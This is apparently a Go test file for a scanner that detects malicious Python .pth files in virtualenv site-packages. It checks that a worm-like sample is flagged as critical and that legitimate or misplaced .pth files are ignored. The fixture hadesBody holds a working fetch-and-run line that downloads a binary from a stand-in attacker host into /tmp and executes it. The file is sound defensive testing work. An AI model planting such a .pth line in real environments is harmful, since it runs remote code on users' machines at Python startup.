package pth_test

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/brynbellomy/veto/internal/scan"
	"github.com/brynbellomy/veto/internal/scan/pth"
)

func writeFile(t *testing.T, p, content string) {
	t.Helper()
	require.NoError(t, os.MkdirAll(filepath.Dir(p), 0o755))
	require.NoError(t, os.WriteFile(p, []byte(content), 0o644))
}

const hadesBody = `import urllib.request, subprocess; ` +
	`urllib.request.urlretrieve('https://attacker.tld/bun','/tmp/bun'); ` +
	`subprocess.Popen(['/tmp/bun','/tmp/_index.js'])` + "\n"

func TestScannerFindsWormInVenv(t *testing.T) {
	root := t.TempDir()
	site := filepath.Join(root, ".venv", "lib", "python3.11", "site-packages")
	writeFile(t, filepath.Join(site, "ensmallen-setup.pth"), hadesBody)
	writeFile(t, filepath.Join(site, "ensmallen", "__init__.py"), "")

	res := pth.New(pth.Options{Roots: []string{root}}).Scan(context.Background())
	require.Empty(t, res.Errors)
	require.Len(t, res.Findings, 1)
	f := res.Findings[0]
	require.Equal(t, scan.SeverityCritical, f.Severity)
	require.Equal(t, scan.SurfaceProject, f.Surface)
	require.Contains(t, f.Title, "Hades")
	var ev []string
	for _, e := range f.Evidence {
		ev = append(ev, e.Label)
	}
	require.True(t, contains(ev, "pth-payload-network"), "missing network evidence; got %v", ev)
}

func TestScannerIgnoresLegitDistutilsPrecedence(t *testing.T) {
	root := t.TempDir()
	site := filepath.Join(root, ".venv", "lib", "python3.11", "site-packages")
	body := `import os; __import__('_distutils_hack').add_shim()`
	writeFile(t, filepath.Join(site, "distutils-precedence.pth"), body)

	res := pth.New(pth.Options{Roots: []string{root}}).Scan(context.Background())
	require.Empty(t, res.Errors)
	require.Empty(t, res.Findings, "legit .pth flagged: %v", res.Findings)
}

func TestScannerIgnoresPthOutsideSitePackages(t *testing.T) {
	root := t.TempDir()
	// A .pth file in the source tree, NOT inside a site-packages dir, must
	// be ignored — Python's site module never loads it.
	writeFile(t, filepath.Join(root, "src", "myproj", "fixtures", "sample.pth"), `import urllib.request`)

	res := pth.New(pth.Options{Roots: []string{root}}).Scan(context.Background())
	require.Empty(t, res.Errors)
	require.Empty(t, res.Findings)
}

func TestScannerFailsClosedOnOversize(t *testing.T) {
	root := t.TempDir()
	site := filepath.Join(root, ".venv", "lib", "python3.11", "site-packages")
	// 300 KiB > 256 KiB cap.
	body := strings.Repeat("foo/bar\n", 50_000)
	writeFile(t, filepath.Join(site, "huge.pth"), body)

	res := pth.New(pth.Options{Roots: []string{root}}).Scan(context.Background())
	require.Empty(t, res.Errors)
	require.Len(t, res.Findings, 1)
	require.Equal(t, scan.SeverityCritical, res.Findings[0].Severity)
}

func TestScannerRespectsContextCancellation(t *testing.T) {
	root := t.TempDir()
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	res := pth.New(pth.Options{Roots: []string{root}}).Scan(ctx)
	require.NotEmpty(t, res.Errors)
}

func contains(s []string, want string) bool {
	for _, x := range s {
		if x == want {
			return true
		}
	}
	return false
}
